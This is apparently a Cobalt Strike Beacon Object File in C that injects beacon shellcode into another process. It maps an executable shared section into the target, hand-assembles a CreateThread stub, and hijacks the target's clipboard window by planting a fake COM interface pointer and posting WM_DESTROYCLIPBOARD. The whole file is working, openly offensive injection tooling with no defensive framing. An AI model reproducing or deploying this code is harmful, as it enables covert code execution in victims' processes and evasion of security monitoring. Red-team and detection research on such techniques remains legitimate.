#include <windows.h>
#include "utils.c"

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtUnmapViewOfSection(HANDLE, PVOID);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$SetPropA(HWND ,LPCSTR , HANDLE );
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$PostMessageA(HWND ,UINT , WPARAM,LPARAM );

void go(char* argc, int len) {	

	datap parser;
	int payloadSize = 0;

	// Parse arguments
	BeaconDataParse(&parser, argc, len);

	// Store the desired PID
	int pid = BeaconDataInt(&parser);
	// command: ClipboardWindow-Inject list
	if (pid == 0) {
		FindTargetClipboardWindow(0);
		return;
	}

	// Store the payload and grab the size
	char* lpPayload = BeaconDataExtract(&parser, &payloadSize);
	BeaconPrintf(CALLBACK_OUTPUT, "[+]Get payload shellcode!Length:%d\n", payloadSize);

	HANDLE hSection = NULL;
	NTSTATUS ntStatus = 0;
	BOOL fResult = FALSE;
	LARGE_INTEGER lintSize = { 0 };
	// Section layout: IUnknown_t (reserve 64 bytes) + __fastcall CreateThread() shellcode (reserve 64 bytes)
	// + beacon payload shellcode
	lintSize.LowPart = payloadSize + 128;

	HANDLE hProcess = NULL;
	HMODULE hmKernel32 = NULL;
	PVOID pLocalAddress = NULL;
	PVOID pRemoteAddress = NULL;
	LPVOID lpPayloadAddress = NULL;
	FARPROC pfnCreateThread = NULL;
	SIZE_T sizeView = 0;

	// __fastcall CreateThread() shellcode
	char shellcode[64] = { 0 };
	int i = 0;
	IUnknown_t iu;

	// Find ClipboardWindow of target pid
	HWND hWindow = FindTargetClipboardWindow(pid);
	if (!hWindow) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-]Target process has no clipboard window!\n", hWindow);
		goto end;
	}
		
	BeaconPrintf(CALLBACK_OUTPUT, "[*]Process with clipboardwnd found!Target pid:%d\n", pid);
	BeaconPrintf(CALLBACK_OUTPUT, "[+]Target HWND:0x%p\n", hWindow);

	hProcess = KERNEL32$OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-]Failed to open target process!\n");
		goto end;
	}
	
	hmKernel32 = KERNEL32$GetModuleHandleA("kernel32");
	if (!hmKernel32) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-]Failed to get kernel32.dll!\n");
		goto end;
	}

	// Create section
	ntStatus = NTDLL$NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
		NULL, &lintSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL
	);
	if (ntStatus == STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+]Section created!Handle:%p\n", hSection);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[-]Failed to create section!Status code:%d\n", ntStatus);
		goto end;
	}

	// Map section to the local process, protection: RW
	ntStatus = NTDLL$NtMapViewOfSection(hSection, (LPVOID)-1, &pLocalAddress,
		NULL, NULL, NULL, &sizeView, ViewUnmap, NULL, PAGE_READWRITE
	);
	if (ntStatus == STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+]Section mapped to the local process!Local address:0x%p\n", pLocalAddress);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[-]Failed to map section to the local process!Status code:%d\n", ntStatus);
		goto end;
	}

	// Map section to the remote process, protection: RX
	ntStatus = NTDLL$NtMapViewOfSection(hSection, hProcess, &pRemoteAddress,
		NULL, NULL, NULL, &sizeView, ViewUnmap, NULL, PAGE_EXECUTE_READ
	);
	if (ntStatus == STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+]Section mapped to the remote process!Remote address:0x%p\n", pRemoteAddress);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[-]Failed to map section to the remote process!Status code:%d\n", ntStatus);
		goto end;
	}

	// Since beacon's payload is an infinite loop,
	// Use CreateThread() __fastcall to execute the payload for not leaving the target process `not responding`.
	// The CreateThread() function will be called by the remote process itself, so feel free
	lpPayloadAddress = (char *)pRemoteAddress + 128;
	pfnCreateThread = KERNEL32$GetProcAddress(hmKernel32, "CreateThread");

	// Protect the stack
	// push rax
	shellcode[i++] = 0x50;

	// push rcx
	shellcode[i++] = 0x51;

	// push rdx
	shellcode[i++] = 0x52;

	// push r8
	shellcode[i++] = 0x41;
	shellcode[i++] = 0x50;

	// push r9
	shellcode[i++] = 0x41;
	shellcode[i++] = 0x51;

	// sub rsp,30h 
	shellcode[i++] = 0x48;
	shellcode[i++] = 0x83;
	shellcode[i++] = 0xEC;
	shellcode[i++] = 0x30;

	// __fastcall CreateThread(0, 0, lpPayloadAddress, 0, 0, 0)
	// xor rcx,rcx
	shellcode[i++] = 0x48;
	shellcode[i++] = 0x31;
	shellcode[i++] = 0xc9;

	// xor rdx,rdx
	shellcode[i++] = 0x48;
	shellcode[i++] = 0x31;
	shellcode[i++] = 0xd2;

	// mov r8, lpPayloadAddress
	shellcode[i++] = 0x49;
	shellcode[i++] = 0xb8;
	mycopy(shellcode + i, &lpPayloadAddress, sizeof(lpPayloadAddress));
	i += sizeof(lpPayloadAddress);

	// xor r9,r9
	shellcode[i++] = 0x4d;
	shellcode[i++] = 0x31;
	shellcode[i++] = 0xc9;

	// mov [rsp+20h],r9
	shellcode[i++] = 0x4c;
	shellcode[i++] = 0x89;
	shellcode[i++] = 0x4c;
	shellcode[i++] = 0x24;
	shellcode[i++] = 0x20;

	// mov [rsp+28h],r9
	shellcode[i++] = 0x4c;
	shellcode[i++] = 0x89;
	shellcode[i++] = 0x4c;
	shellcode[i++] = 0x24;
	shellcode[i++] = 0x28;

	// mov rax,CreateThread
	shellcode[i++] = 0x48;
	shellcode[i++] = 0xb8;
	mycopy(shellcode + i, &pfnCreateThread, sizeof(pfnCreateThread));
	i += sizeof(pfnCreateThread);

	// call rax
	shellcode[i++] = 0xff;
	shellcode[i++] = 0xd0;

	// add rsp,30h
	shellcode[i++] = 0x48;
	shellcode[i++] = 0x83;
	shellcode[i++] = 0xC4;
	shellcode[i++] = 0x30;

	// pop r9
	shellcode[i++] = 0x41;
	shellcode[i++] = 0x59;

	// pop r8
	shellcode[i++] = 0x41;
	shellcode[i++] = 0x58;

	// pop rdx
	shellcode[i++] = 0x5A;

	// pop rcx
	shellcode[i++] = 0x59;

	// pop rax
	shellcode[i++] = 0x58;

	// ret
	shellcode[i++] = 0xc3;

	iu.lpVtbl = (ULONG_PTR)pRemoteAddress + sizeof(ULONG_PTR);
	// CALLBACK function point to the shellcode
	iu.Release = (ULONG_PTR)pRemoteAddress + 64;

	// Copy `IUnknown_t` + `__fastcall CreateThread() shellcode` + `beacon payload shellcode` to the memory
	mycopy(pLocalAddress, &iu, sizeof(iu));
	mycopy((char *)pLocalAddress + 64, &shellcode, sizeof(shellcode));
	mycopy((char *)pLocalAddress + 128, lpPayload, payloadSize);

	// Unmap local process's section view
	NTDLL$NtUnmapViewOfSection( (LPVOID) -1, pLocalAddress);

	BeaconPrintf(CALLBACK_OUTPUT, "[*]Try to set prop and post message...\n");

	// Set `ClipboardDataObjectInterface` prop for the target window
	fResult = USER32$SetPropA(hWindow, "ClipboardDataObjectInterface", pRemoteAddress);
	if (!fResult) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-]Failed to set prop for the target window!\n");
		goto end;
	}

	// Post message to trigger the CALLBACK function
	fResult = USER32$PostMessageA(hWindow, WM_DESTROYCLIPBOARD, 0, 0);
	if (!fResult) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-]Failed to post message to the target window!\n");
		goto end;
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[*]Success!\n");
	}

end:
	if (hSection)
		KERNEL32$CloseHandle(hSection);

	if (hmKernel32)
		KERNEL32$FreeLibrary(hmKernel32);

	if (hProcess)
		KERNEL32$CloseHandle(hProcess);
	
	return ;
}